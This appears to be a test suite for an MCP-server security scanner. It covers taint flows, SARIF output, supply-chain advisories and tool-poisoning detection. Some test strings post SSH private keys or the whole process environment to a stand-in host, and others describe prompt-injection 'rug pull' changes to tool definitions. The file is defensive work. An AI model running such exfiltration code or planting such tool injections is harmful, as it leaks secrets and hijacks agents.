import { test } from 'node:test';
import assert from 'node:assert/strict';
import { cpSync, mkdtempSync, readFileSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { AgentRuntime, validate, validateSarif, readAudit, createMcpHandler } from 'mythos-agent-core';
import {
  manifest, scanSource, scanConfig, scanFlows, sarif, normalizeToolDump, scanTools, pinTools, diffPins,
  inRange, cmpVersion, bundledAdvisories, applyPolicy, RULES, OWASP_MCP,
} from '../src/index.js';

const fixtures = fileURLToPath(new URL('../fixtures', import.meta.url));
const tmpRoot = (p) => { const r = mkdtempSync(join(tmpdir(), p)); cpSync(fixtures, r, { recursive: true }); return r; };
const server = (files) => { const d = mkdtempSync(join(tmpdir(), 'nem2-')); for (const [f, t] of Object.entries(files)) { mkdirSync(join(d, f, '..'), { recursive: true }); writeFileSync(join(d, f), t); } return d; };
const ids = (r) => r.items.map((i) => i.id);
const fixAdv = JSON.parse(readFileSync(join(fixtures, 'advisories.json'), 'utf8')).advisories;
const json = (p) => JSON.parse(readFileSync(join(fixtures, p), 'utf8'));

// ---- taint-style flows ----
test('flows: seeded vulnerable server is flagged with a source -> sink path', () => {
  const r = scanSource(join(fixtures, 'flow-server'), { advisories: fixAdv });
  const env = r.items.find((i) => i.id === 'NEM-FLOW-ENV-TO-NET');
  assert.ok(env, 'env -> network flow');
  assert.deepEqual(env.flow.map((s) => s.line), [5, 6, 9]);
  assert.match(env.flow[2].label, /sink: fetch/);
  const exec = r.items.filter((i) => i.id === 'NEM-FLOW-INPUT-TO-EXEC');
  assert.deepEqual(exec.map((i) => `${i.file}:${i.flow.map((s) => s.line).join('>')}`).sort(), ['src/server.js.sample:13>15>16', 'src/tools.py.sample:9>11']);
  for (const id of ['NEM-TOKEN-PASSTHROUGH', 'NEM-FLOW-INPUT-TO-NET', 'NEM-FLOW-INPUT-TO-PATH', 'NEM-TLS-DISABLED', 'NEM-CORS-ANY', 'NEM-BIND-ALL', 'NEM-UNSAFE-DESERIALIZE', 'NEM-SQL-CONCAT']) assert.ok(ids(r).includes(id), id);
});
test('flows: the tidy server stays clean and guards are respected', () => {
  assert.equal(scanSource(join(fixtures, 'tidy-server')).findings, 0);
  assert.equal(scanFlows("const ALLOWLIST = ['git'];\nexport const t = { run: ({ cmd }) => { if (!ALLOWLIST.includes(cmd)) throw new Error('no'); return execFileSync(cmd, []); } };\n").length, 0);
  assert.equal(scanFlows("export const t = { read: ({ p }) => readFileSync(safePath(ROOT, p)) };\n").length, 0);
  assert.equal(scanFlows("const key = process.env.API_KEY;\nconsole.log('ok');\n").length, 0);
  const re = scanFlows("let u = args.url;\nu = 'https://fixed.example.com';\nfetch(u);\n");
  assert.equal(re.length, 0, 'reassignment to a constant clears taint');
  const secrets = scanFlows("const k = readFileSync(home + '/.ssh/id_rsa');\nawait fetch('https://x.example.invalid', { body: k });\n");
  assert.equal(secrets[0].id, 'NEM-FLOW-ENV-TO-NET');
});

test('flows: ordinary API-client code is not flagged; real leaks, SSRF and passthrough are', () => {
  const quiet = {
    'secret as a bearer header': "const KEY = process.env.API_KEY;\nconst r = await fetch('https://api.example.com/v1/x', { headers: { Authorization: `Bearer ${KEY}` } });\n",
    'secret in a headers variable': "const KEY = process.env.API_KEY;\nconst headers = { 'X-Api-Key': KEY };\nawait fetch(URL, { headers });\n",
    'python auth header': "key = os.environ['API_TOKEN']\nr = requests.get('https://api.example.com/x', headers={'Authorization': f'Bearer {key}'})\n",
    'base URL and port from env': "const BASE = process.env.BASE_URL;\nconst { PORT } = process.env;\nawait fetch(`${BASE}/items`);\nawait fetch(`http://localhost:${PORT}/x`);\n",
    'input after a fixed host': "export const t = { get: async (args) => fetch(`https://api.example.com/items/${args.id}`) };\n",
    'input in the request body': "export const t = { add: async (args) => fetch('https://api.example.com/items', { method: 'POST', body: JSON.stringify(args.item) }) };\n",
    'regex exec and array callbacks': "const m = /a(b)/.exec(args.text);\nconst rows = items.map(({ id, name }) => ({ id, name }));\nwriteFileSync(join(ROOT, 'out.json'), JSON.stringify(rows.map(({ id }) => id)));\n",
    'input as file content, fixed path': "export const t = { save: async (args) => writeFileSync(OUT_FILE, args.text) };\n",
    'fixed-host URL in a variable': "export const t = { get: async (args) => { const url = `https://api.example.com/items/${args.id}`; return fetch(url); } };\n",
  };
  for (const [name, code] of Object.entries(quiet)) assert.deepEqual(scanFlows(code).map((f) => f.id), [], name);
  const loud = {
    'NEM-FLOW-ENV-TO-NET': ["const KEY = process.env.API_KEY;\nawait fetch('https://x.example.invalid', { method: 'POST', body: JSON.stringify({ k: KEY }) });\n", "const KEY = process.env.MAPS_KEY;\nawait fetch(`https://maps.example.com/geo?key=${KEY}`);\n", "await fetch('https://x.example.invalid', { method: 'POST', body: JSON.stringify(process.env) });\n"],
    'NEM-FLOW-INPUT-TO-NET': ["export const t = { get: async (args) => fetch(args.url) };\n", "export const t = { get: async ({ host }) => fetch(`https://${host}/x`) };\n", "export const t = { get: async (args) => axios({ url: args.target, method: 'get' }) };\n"],
    'NEM-FLOW-INPUT-TO-EXEC': ["export const t = { dl: async (args) => { const url = `https://api.example.com/f/${args.id}`; return execSync('curl ' + url); } };\n"],
    'NEM-TOKEN-PASSTHROUGH': ["const tok = req.headers.authorization;\nawait fetch('https://up.example.com', { headers: { authorization: tok } });\n"],
  };
  for (const [id, codes] of Object.entries(loud)) for (const code of codes) assert.deepEqual(scanFlows(code).map((f) => f.id), [id], code);
});

// ---- SARIF ----
test('SARIF: valid 2.1.0, full rule metadata, codeFlows, suppressions, deterministic', () => {
  const policy = json('nemesis-policy.json');
  const r = scanSource(join(fixtures, 'flow-server'), { advisories: fixAdv, policy });
  const s = sarif(r, '0.2.0', { uriPrefix: 'servers/flow/' });
  assert.deepEqual(validateSarif(s), { ok: true, errors: [] });
  const run = s.runs[0];
  assert.equal(run.tool.driver.rules.length, Object.keys(RULES).length);
  for (const res of run.results) assert.equal(run.tool.driver.rules[res.ruleIndex].id, res.ruleId);
  const rule = run.tool.driver.rules.find((x) => x.id === 'NEM-FLOW-INPUT-TO-EXEC');
  assert.equal(rule.properties['security-severity'], '8.0');
  assert.ok(rule.properties.tags.includes('external/cwe/cwe-78'));
  assert.ok(rule.properties.tags.includes('external/owasp-mcp-top-10/mcp05'));
  assert.match(rule.help.markdown, /\*\*Fix:\*\*/);
  const flow = run.results.find((x) => x.ruleId === 'NEM-FLOW-ENV-TO-NET');
  assert.equal(flow.codeFlows[0].threadFlows[0].locations.length, 3);
  assert.equal(flow.locations[0].physicalLocation.artifactLocation.uri, 'servers/flow/src/server.js');
  const sup = run.results.filter((x) => x.suppressions);
  assert.equal(sup.length, 2); assert.equal(sup[0].suppressions[0].kind, 'external'); assert.ok(sup[0].suppressions[0].justification);
  assert.equal(JSON.stringify(sarif(r, '0.2.0')), JSON.stringify(sarif(scanSource(join(fixtures, 'flow-server'), { advisories: fixAdv, policy }), '0.2.0')), 'same input, same bytes');
  assert.ok(!JSON.stringify(sarif(scanSource(join(fixtures, 'risky-server')), '0.2.0')).includes('AKIAIOSFODNN7EXAMPLE'), 'secrets stay masked in SARIF');
});

// ---- lockfile / advisories ----
test('supply chain: lockfile, registry, integrity, requirements and advisory list', () => {
  const r = scanSource(join(fixtures, 'flow-server'), { advisories: fixAdv });
  const t = r.items.map((i) => `${i.id} ${i.title}`).join('\n');
  assert.match(t, /NEM-ADVISORY acme-mcp-helper@1\.2\.0: FICT-2026-0001 \(fixed in 1\.3\.0\)/);
  assert.match(t, /NEM-LOCK-NONREGISTRY tiny-notes-lib resolves from https:\/\/files\.example\.com/);
  assert.match(t, /NEM-LOCK-NO-INTEGRITY fast-convert-kit@0\.4\.2/);
  assert.match(t, /NEM-PY-UNPINNED example-mcp-kit/);
  assert.match(t, /NEM-ADVISORY demo-yaml-tool==0\.3\.1/);
  assert.ok(!/pinned-ok-lib/.test(t));
  assert.ok(ids(scanSource(join(fixtures, 'risky-server'))).includes('NEM-NO-LOCKFILE'));
  const pinned = scanSource(server({ 'package.json': '{"dependencies":{"acme-mcp-helper":"1.3.0"}}', 'package-lock.json': '{"lockfileVersion":3,"packages":{"":{},"node_modules/acme-mcp-helper":{"version":"1.3.0","resolved":"https://registry.npmjs.org/acme-mcp-helper/-/acme-mcp-helper-1.3.0.tgz","integrity":"sha512-x"}}}' }), { advisories: fixAdv });
  assert.equal(pinned.findings, 0, JSON.stringify(pinned.items));
});
test('advisory ranges and the bundled snapshot (config check, offline)', () => {
  assert.ok(inRange('0.1.10', '>=0.0.5 <0.1.16')); assert.ok(!inRange('0.1.16', '>=0.0.5 <0.1.16'));
  assert.ok(inRange('2025.3.28', '<2025.7.1')); assert.ok(inRange('1.2.4', '1.2.3 || 1.2.4')); assert.ok(!inRange('not-a-version', '*'));
  assert.equal(cmpVersion('1.0.0-beta', '1.0.0'), -1);
  const b = bundledAdvisories();
  assert.deepEqual(validate(manifest.configSchemas['nemesis-advisories'], b).errors, []);
  const bad = scanConfig({ mcpServers: { r: { command: 'npx', args: ['-y', 'mcp-remote@0.1.10', 'https://mcp.example.com/sse'] } } }, { advisories: b.advisories });
  assert.ok(bad.items.some((i) => i.id === 'NEM-CFG-ADVISORY' && /CVE-2025-6514/.test(i.title)));
  const good = scanConfig({ mcpServers: { r: { command: 'npx', args: ['-y', 'mcp-remote@0.1.16', 'https://mcp.example.com/sse'] } } }, { advisories: b.advisories });
  assert.equal(good.findings, 0);
  const fsHit = (v) => scanConfig({ mcpServers: { f: { command: 'npx', args: ['-y', `@modelcontextprotocol/server-filesystem@${v}`, './project'] } } }, { advisories: b.advisories }).items.some((i) => i.id === 'NEM-CFG-ADVISORY');
  assert.deepEqual(['0.6.2', '0.6.4', '2025.3.28', '2025.7.1'].map(fsHit), [true, false, true, false]);
});

// ---- config ----
test('config: auto-approve, trust, permission bypass, duplicates, advisories; line numbers', () => {
  const text = readFileSync(join(fixtures, 'mcp-extra.json'), 'utf8');
  const r = scanConfig(JSON.parse(text), { text, file: 'mcp-extra.json', advisories: fixAdv });
  const by = (id) => r.items.filter((i) => i.id === id);
  assert.equal(by('NEM-CFG-AUTO-APPROVE').length, 3);
  assert.equal(by('NEM-CFG-AUTO-APPROVE').find((i) => i.server === 'helper').severity, 'high');
  assert.equal(by('NEM-CFG-AUTO-APPROVE').find((i) => i.server === 'readonly').severity, 'low');
  assert.equal(by('NEM-CFG-SKIP-PERMS')[0].server, 'agent-shell');
  assert.equal(by('NEM-CFG-DUPLICATE')[0].server, 'helper-copy');
  assert.equal(by('NEM-CFG-ADVISORY').length, 2);
  assert.equal(by('NEM-CFG-SKIP-PERMS')[0].line, 5);
});

// ---- tool definitions ----
test('tools: poisoning, shadowing, collisions, look-alikes, schemas and annotations', () => {
  const r = scanTools(normalizeToolDump(json('tools/multi.json')));
  const has = (id, tool) => r.some((f) => f.id === id && f.tool === tool);
  assert.ok(has('NEM-TOOL-SHADOWING', 'get_forecast'));
  assert.ok(has('NEM-TOOL-HIDDEN-UNICODE', 'search'));
  assert.ok(has('NEM-TOOL-CONTEXT-EXFIL', 'search'));
  assert.ok(has('NEM-TOOL-NAME-COLLISION', 'search'));
  assert.ok(r.some((f) => f.id === 'NEM-TOOL-CONFUSABLE-NAME' && /U\+0455/.test(f.snippet)));
  assert.ok(has('NEM-TOOL-FREEFORM-EXEC', 'run_query'));
  assert.ok(has('NEM-TOOL-COERCIVE', 'run_query'));
  assert.ok(has('NEM-TOOL-ANNOTATION-MISMATCH', 'delete_rows'));
  assert.ok(has('NEM-TOOL-NO-ANNOTATIONS', 'update_row'));
  assert.ok(!r.some((f) => f.tool === 'send_email'), 'the clean mail tool is not flagged');
  assert.equal(scanTools(normalizeToolDump(json('tools/notes-v1.json'))).length, 0);
  const v2 = scanTools(normalizeToolDump(json('tools/notes-v2.json')));
  assert.ok(v2.some((f) => f.id === 'NEM-TOOL-INJECTION')); assert.ok(v2.some((f) => f.id === 'NEM-TOOL-SENSITIVE-PATH'));
  assert.throws(() => normalizeToolDump({ nope: 1 }), /not a tools\/list result/);
});
test('pins: unchanged tools match; a poisoned change is a suspected rug pull with a diff', () => {
  const pins = pinTools(normalizeToolDump(json('tools/notes-v1.json'), 'notes'));
  assert.deepEqual(pins, json('tools/notes-pins.json'), 'pin file is deterministic');
  assert.equal(diffPins(pins, normalizeToolDump(json('tools/notes-v1.json'), 'notes')).verdict, 'matches_pin');
  const d = diffPins(pins, normalizeToolDump(json('tools/notes-v2.json'), 'notes'));
  assert.equal(d.verdict, 'rug_pull_suspected');
  const c = d.changes.find((x) => x.tool === 'read_note');
  assert.deepEqual(c.fields, ['description', 'inputSchema']);
  assert.match(c.diff, /^\+.*<IMPORTANT>/m); assert.match(c.diff, /^\+.*"sidenote"/m);
  assert.ok(d.changes.some((x) => x.change === 'added' && x.tool === 'export_notes'));
  const benign = JSON.parse(JSON.stringify(json('tools/notes-v1.json'))); benign.tools[0].description = 'List note titles, newest first.';
  const b = diffPins(pins, normalizeToolDump(benign, 'notes'));
  assert.equal(b.verdict, 'changed_since_pin'); assert.equal(b.findings[0].severity, 'medium');
});

// ---- policy and config schemas ----
test('policy: suppressions are listed with reasons, overrides apply, egress allowlist', () => {
  const r = scanSource(join(fixtures, 'flow-server'), { advisories: fixAdv, policy: json('nemesis-policy.json') });
  assert.ok(r.suppressed.some((i) => i.id === 'NEM-BIND-ALL' && /fictional review note/.test(i.suppressed)));
  assert.ok(r.suppressed.some((i) => i.id === 'NEM-OPEN-EGRESS' && /egress_allowlist/.test(i.suppressed)));
  assert.ok(!r.items.some((i) => i.id === 'NEM-BIND-ALL'));
  assert.equal(r.items.find((i) => i.id === 'NEM-LOCK-NO-INTEGRITY').severity, 'medium');
  const ig = applyPolicy([{ id: 'NEM-EVAL', severity: 'high', file: 'a.js' }], { suppress: [{ rule: 'NEM-EVAL', path: 'b/**', reason: 'other folder' }] });
  assert.equal(ig.items.length, 1);
  const skipped = scanSource(join(fixtures, 'flow-server'), { policy: { ignore_paths: ['src/**'] } });
  assert.ok(!skipped.items.some((i) => i.file.startsWith('src/')));
});
test('config schemas: fixtures validate; 3 mutated policies fail with JSON pointers', async () => {
  const s = manifest.configSchemas;
  assert.deepEqual(validate(s['nemesis-policy'], json('nemesis-policy.json')).errors, []);
  assert.deepEqual(validate(s['nemesis-advisories'], json('advisories.json')).errors, []);
  assert.deepEqual(validate(s['nemesis-tool-pins'], json('tools/notes-pins.json')).errors, []);
  const root = tmpRoot('nem2-cfg-');
  const base = json('nemesis-policy.json');
  const mutants = {
    'unknown.json': [{ ...base, egres_allowlist: ['x.example.com'] }, '/egres_allowlist'],
    'type.json': [{ ...base, egress_allowlist: 'upstream.example.com' }, '/egress_allowlist'],
    'missing.json': [{ ...base, suppress: [{ rule: 'NEM-BIND-ALL' }] }, '/suppress/0/reason'],
  };
  const rt = new AgentRuntime(manifest, { root, audit: false });
  for (const [f, [cfg, ptr]] of Object.entries(mutants)) {
    writeFileSync(join(root, f), JSON.stringify(cfg));
    const v = validate(s['nemesis-policy'], cfg);
    assert.equal(v.ok, false); assert.ok(v.errors.some((e) => e.path === ptr), `${f}: ${JSON.stringify(v.errors)}`);
    const r = await rt.call('nemesis_scan_server', { dir: 'tidy-server', policy: f });
    assert.equal(r.status, 'error', f); assert.ok(JSON.stringify(r).includes(ptr), `${f} error names ${ptr}`);
  }
});

// ---- tools through the runtime ----
test('runtime: scan_tools, pin_tools then check_pins, report with gate and audit hash', async () => {
  const root = tmpRoot('nem2-rt-');
  const rt = new AgentRuntime(manifest, { root });
  const st = await rt.call('nemesis_scan_tools', { tools: 'tools/multi.json' });
  assert.equal(st.status, 'executed'); assert.equal(st.result.verdict, 'review_before_use'); assert.equal(st.result.tools, 8);
  const p = await rt.call('nemesis_pin_tools', { tools: 'tools/notes-v1.json', server: 'notes', out_dir: 'pins' });
  assert.equal(p.status, 'executed'); assert.match(p.result.output_sha256, /^[0-9a-f]{64}$/);
  const same = await rt.call('nemesis_check_pins', { tools: 'tools/notes-v1.json', pins: 'pins/tool-pins.json' });
  assert.equal(same.result.pin_verdict, 'matches_pin');
  const ch = await rt.call('nemesis_check_pins', { tools: 'tools/notes-v2.json', pins: 'pins/tool-pins.json' });
  assert.equal(ch.result.pin_verdict, 'rug_pull_suspected');
  const w = await rt.call('nemesis_write_report', { dir: 'flow-server', config: 'mcp-extra.json', tools: 'tools/notes-v2.json', pins: 'tools/notes-pins.json', policy: 'nemesis-policy.json', fail_on: 'high' });
  assert.equal(w.status, 'executed'); assert.equal(w.result.gate.result, 'fail'); assert.equal(w.result.suppressed, 2);
  const md = readFileSync(w.result.files[0], 'utf8');
  for (const s of ['## Fix first', '## Data flows', '## Tool changes since the pin', '## OWASP MCP Top 10 view', '## Suppressed by policy', '```diff']) assert.ok(md.includes(s), s);
  const sarifDoc = JSON.parse(readFileSync(w.result.files[2], 'utf8'));
  assert.deepEqual(validateSarif(sarifDoc).errors, []);
  assert.ok(sarifDoc.runs[0].results.some((x) => x.locations[0].physicalLocation.artifactLocation.uri === 'flow-server/src/server.js'), 'paths are root-relative');
  const log = readAudit(join(root, '.mythos', 'audit.jsonl'));
  assert.equal(log.find((e) => e.tool === 'nemesis_write_report').output_sha256, w.result.output_sha256);
  const tidy = await rt.call('nemesis_write_report', { dir: 'tidy-server', fail_on: 'low', out_dir: 'tidy-out' });
  assert.equal(tidy.result.gate.result, 'pass');
  const bad = await rt.call('nemesis_scan_tools', { tools: 'tools/multi.json', bogus: 1 });
  assert.equal(bad.status, 'error');
});

// ---- prompt ----
test('MCP prompt walks the review end to end', async () => {
  const p = manifest.prompts.find((x) => x.name === 'nemesis_review_server');
  for (const t of ['nemesis_scan_config', 'nemesis_scan_server', 'nemesis_scan_tools', 'nemesis_check_pins', 'nemesis_pin_tools', 'nemesis_write_report', 'blocked']) assert.ok(p.text.includes(t), t);
  const h = createMcpHandler(new AgentRuntime(manifest, { root: tmpRoot('nem2-p-'), audit: false }));
  const r = await h({ jsonrpc: '2.0', id: 1, method: 'prompts/get', params: { name: 'nemesis_review_server', arguments: { dir: 'srv', tools: 'tools.json' } } });
  assert.match(r.result.messages[0].content.text, /dir "srv"/);
  assert.equal(Object.keys(OWASP_MCP).length, 10);
  for (const [id, rule] of Object.entries(RULES)) { assert.ok(rule.fix && rule.why && rule.owasp.length && rule.cwe.length, id); for (const o of rule.owasp) assert.ok(OWASP_MCP[o], `${id} ${o}`); }
});

test('README rule table lists every rule with its current severity and title', () => {
  const md = readFileSync(fileURLToPath(new URL('../README.md', import.meta.url)), 'utf8');
  for (const [id, r] of Object.entries(RULES)) assert.ok(md.includes(`| \`${id}\` | ${r.severity} | ${r.title.replace(/\|/g, '/')} |`), id);
});
